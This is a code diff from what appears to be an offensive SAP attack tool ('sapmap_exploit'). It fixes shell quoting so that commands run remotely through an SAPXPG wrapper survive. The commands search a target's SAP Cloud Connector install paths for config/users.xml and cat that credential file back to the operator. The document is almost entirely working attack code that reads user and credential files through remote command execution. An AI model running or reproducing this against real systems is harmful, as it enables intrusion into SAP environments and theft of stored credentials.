@@ -1832,12 +1832,15 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 from sapmap_exploit import run_os_command
                 # Probe common SCC install paths; use double-quoted paths
                 # inside, no single quotes needed, so -c "..." is safe.
+                # Avoid ALL inner double-quotes — the SAPXPG -c "..." wrapper
+                # breaks on any " inside the command string.  Use $(...) and
+                # unquoted variable references; paths without spaces are safe.
                 probe_cmd = (
                     'for d in /opt/sap/scc /usr/local/scc '
                     '/opt/sapscc /opt/cloud-connector '
                     '/opt/SAP/cloud-connector; do '
-                    'if [ -f "$d/config/users.xml" ]; then '
-                    'echo "USERS_PATH $d/config/users.xml"; break; fi; done'
+                    'F=$d/config/users.xml; '
+                    'if [ -f $F ]; then echo USERS_PATH $F; break; fi; done'
                 )
                 r = run_os_command(n, "/bin/sh", f'-c "{probe_cmd}"')
                 out = "\n".join(r.get("output") or [])
@@ -1849,7 +1852,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     continue
                 fpath = m.group(1)
                 r2 = run_os_command(n, "/bin/sh",
-                                    f'-c "cat {fpath} 2>/dev/null"')
+                                    f"-c 'cat {fpath} 2>/dev/null'")
                 content = "\n".join(r2.get("output") or [])
                 print(f"[*] SCC {host}: cat output ({len(content)} chars): "
                       f"{content[:80]!r}")
